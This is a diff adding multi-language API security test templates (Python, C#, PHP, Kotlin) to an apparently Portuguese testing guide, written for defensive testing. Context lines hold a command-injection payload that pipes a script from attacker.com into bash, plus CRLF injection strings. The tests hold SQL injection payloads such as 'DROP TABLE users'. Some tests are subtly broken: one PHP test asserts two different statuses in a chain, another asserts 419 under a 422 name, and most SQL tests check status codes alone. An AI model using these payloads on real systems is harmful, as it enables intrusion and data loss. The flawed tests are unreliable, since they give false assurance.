@@ -551,3 +551,204 @@ $(curl http://attacker.com/shell.sh | bash)
 %0d%0aSet-Cookie:%20malicious=true
 %0d%0aLocation:%20http://attacker.com
 ```
+
+---
+
+### Templates Adicionais por Linguagem
+
+#### Python (pytest + httpx)
+
+```python
+import pytest
+import httpx
+
+BASE_URL = "http://localhost:8000/api/v1"
+
+class TestAuthentication:
+    def test_should_return_401_when_no_token(self):
+        response = httpx.get(f"{BASE_URL}/users/me")
+        assert response.status_code == 401
+        assert "stack" not in response.text
+
+    def test_should_return_401_when_token_expired(self):
+        headers = {"Authorization": "Bearer expired.token.here"}
+        response = httpx.get(f"{BASE_URL}/users/me", headers=headers)
+        assert response.status_code == 401
+
+class TestAuthorization:
+    def test_should_return_403_when_accessing_other_users_resource(self, user_a_token):
+        headers = {"Authorization": f"Bearer {user_a_token}"}
+        response = httpx.get(f"{BASE_URL}/users/user-b-id/orders", headers=headers)
+        assert response.status_code == 403
+
+class TestSQLInjection:
+    @pytest.mark.parametrize("payload", [
+        "' OR '1'='1",
+        "'; DROP TABLE users; --",
+        "' UNION SELECT password FROM users --",
+    ])
+    def test_should_not_execute_sql_injection(self, payload, auth_headers):
+        response = httpx.get(f"{BASE_URL}/users/search", params={"name": payload}, headers=auth_headers)
+        assert response.status_code in [200, 400]
+
+class TestInputValidation:
+    def test_should_return_400_when_name_exceeds_limit(self, admin_headers):
+        response = httpx.post(f"{BASE_URL}/users", json={"name": "A" * 101, "email": "t@t.com"}, headers=admin_headers)
+        assert response.status_code == 400
+```
+
+#### C# (xUnit + WebApplicationFactory)
+
+```csharp
+public class AuthenticationTests : IClassFixture<WebApplicationFactory<Program>>
+{
+    private readonly HttpClient _client;
+
+    public AuthenticationTests(WebApplicationFactory<Program> factory)
+    {
+        _client = factory.CreateClient();
+    }
+
+    [Fact]
+    public async Task Should_Return_401_When_No_Token()
+    {
+        var response = await _client.GetAsync("/api/v1/users/me");
+        Assert.Equal(HttpStatusCode.Unauthorized, response.StatusCode);
+    }
+
+    [Fact]
+    public async Task Should_Return_403_When_Accessing_Other_Users_Resource()
+    {
+        _client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", userAToken);
+        var response = await _client.GetAsync("/api/v1/users/user-b-id/orders");
+        Assert.Equal(HttpStatusCode.Forbidden, response.StatusCode);
+    }
+
+    [Theory]
+    [InlineData("' OR '1'='1")]
+    [InlineData("'; DROP TABLE users; --")]
+    [InlineData("' UNION SELECT password FROM users --")]
+    public async Task Should_Not_Execute_SQL_Injection(string payload)
+    {
+        var response = await _client.GetAsync($"/api/v1/users/search?name={Uri.EscapeDataString(payload)}");
+        Assert.True(response.StatusCode == HttpStatusCode.OK || response.StatusCode == HttpStatusCode.BadRequest);
+    }
+
+    [Fact]
+    public async Task Should_Return_400_When_Name_Exceeds_100_Characters()
+    {
+        var body = new { name = new string('A', 101), email = "test@example.com" };
+        var response = await _client.PostAsJsonAsync("/api/v1/users", body);
+        Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
+    }
+}
+```
+
+#### PHP (PHPUnit + Laravel)
+
+```php
+class AuthenticationTest extends TestCase
+{
+    public function test_should_return_401_when_no_token(): void
+    {
+        $response = $this->getJson('/api/v1/users/me');
+        $response->assertStatus(401);
+        $response->assertJsonMissing(['stack']);
+    }
+
+    public function test_should_return_403_when_accessing_other_users_resource(): void
+    {
+        $userA = User::factory()->create();
+        $userB = User::factory()->create();
+
+        $response = $this->actingAs($userA)->getJson("/api/v1/users/{$userB->id}/orders");
+        $response->assertStatus(403);
+    }
+
+    /**
+     * @dataProvider sqlInjectionPayloads
+     */
+    public function test_should_not_execute_sql_injection(string $payload): void
+    {
+        $user = User::factory()->create();
+        $countBefore = User::count();
+
+        $response = $this->actingAs($user)->getJson("/api/v1/users/search?name=" . urlencode($payload));
+        $response->assertStatus(200)->assertStatus(400);
+
+        $this->assertEquals($countBefore, User::count());
+    }
+
+    public static function sqlInjectionPayloads(): array
+    {
+        return [
+            ["' OR '1'='1"],
+            ["'; DROP TABLE users; --"],
+            ["' UNION SELECT password FROM users --"],
+        ];
+    }
+
+    public function test_should_return_400_when_name_exceeds_limit(): void
+    {
+        $admin = User::factory()->admin()->create();
+        $response = $this->actingAs($admin)->postJson('/api/v1/users', [
+            'name' => str_repeat('A', 101),
+            'email' => 'test@example.com',
+        ]);
+        $response->assertStatus(400);
+    }
+
+    public function test_should_return_422_when_csrf_token_missing(): void
+    {
+        $response = $this->post('/admin/settings', ['key' => 'value']);
+        $response->assertStatus(419); // Laravel CSRF
+    }
+}
+```
+
+#### Kotlin (JUnit 5 + Spring Boot)
+
+```kotlin
+@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
+class SecurityTests @Autowired constructor(
+    private val restTemplate: TestRestTemplate
+) {
+    @Test
+    fun `should return 401 when no auth token provided`() {
+        val response = restTemplate.getForEntity("/api/v1/users/me", String::class.java)
+        assertThat(response.statusCode).isEqualTo(HttpStatus.UNAUTHORIZED)
+    }
+
+    @Test
+    fun `should return 403 when user accesses other users resource`() {
+        val headers = HttpHeaders().apply { setBearerAuth(userAToken) }
+        val response = restTemplate.exchange(
+            "/api/v1/users/user-b-id/orders", HttpMethod.GET,
+            HttpEntity<Void>(headers), String::class.java
+        )
+        assertThat(response.statusCode).isEqualTo(HttpStatus.FORBIDDEN)
+    }
+
+    @ParameterizedTest
+    @ValueSource(strings = ["' OR '1'='1", "'; DROP TABLE users; --", "' UNION SELECT password FROM users --"])
+    fun `should not execute sql injection`(payload: String) {
+        val headers = HttpHeaders().apply { setBearerAuth(validToken) }
+        val response = restTemplate.exchange(
+            "/api/v1/users/search?name=${URLEncoder.encode(payload, "UTF-8")}",
+            HttpMethod.GET, HttpEntity<Void>(headers), String::class.java
+        )
+        assertThat(response.statusCode).isIn(HttpStatus.OK, HttpStatus.BAD_REQUEST)
+    }
+
+    @Test
+    fun `should return 400 when name exceeds 100 characters`() {
+        val body = mapOf("name" to "A".repeat(101), "email" to "test@example.com")
+        val headers = HttpHeaders().apply { setBearerAuth(adminToken); contentType = MediaType.APPLICATION_JSON }
+        val response = restTemplate.exchange(
+            "/api/v1/users", HttpMethod.POST,
+            HttpEntity(body, headers), String::class.java
+        )
+        assertThat(response.statusCode).isEqualTo(HttpStatus.BAD_REQUEST)
+    }
+}
+```
